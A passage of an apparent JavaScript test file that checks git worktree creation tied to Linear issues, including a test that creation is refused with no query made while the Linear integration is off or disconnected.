  await runtime.invoke("worktree:create", [{ projectPath: project, baseBranch: "main", prompt: "x", issueKey: "ENG-12" }]);
  const mapped = await runtime.invoke("linear:worktree-issues", [project]);
  const [only] = Object.values(mapped);
  assert.equal(only?.key, "ENG-12");
});

test("worktree:create from a Linear issue refuses while Linear is off or disconnected, before any query", async (t) => {
  const { project, dataDir, make } = await fixture(t);
  execFileSync("git", ["-C", project, "-c", "user.name=Test", "-c", "user.email=test@example.invalid", "commit", "--allow-empty", "-m", "Initial"], {
    stdio: "ignore",
  });
  const queried = [];
  const linear = {
    clientId: "cid",
    apiBase: "https://api.test",
    port: 0,
    fetchImpl: async (url, init) => {
      queried.push(init.body);
      return { ok: true, status: 200, json: async () => ({ data: {} }) };
    },
    openBrowser: () => {},
  };
  const runtime = make({ worktreeRoot: path.join(path.dirname(project), "worktrees"), linear });
  await runtime.openProject(project);
  const before = execFileSync("git", ["-C", project, "worktree", "list", "--porcelain"], { encoding: "utf8" });
  const attempt = () => runtime.invoke("worktree:create", [{ projectPath: project, baseBranch: "main", prompt: "x", issueKey: "ENG-12" }]);

  // Off: nothing stored, so the switch is off and no token exists.
  await assert.rejects(attempt(), { message: "Linear is off in Settings › Experimental." });

  // On, but never connected.
  await fs.mkdir(path.join(dataDir, "linear"), { recursive: true });
  await fs.writeFile(path.join(dataDir, "linear", "settings.json"), JSON.stringify({ enabled: true }));
  await assert.rejects(attempt(), { message: "Linear isn't connected." });

  assert.deepEqual(queried, [], "No Linear query while Linear is off or disconnected");
  assert.equal(execFileSync("git", ["-C", project, "worktree", "list", "--porcelain"], { encoding: "utf8" }), before, "Nothing is created");
});
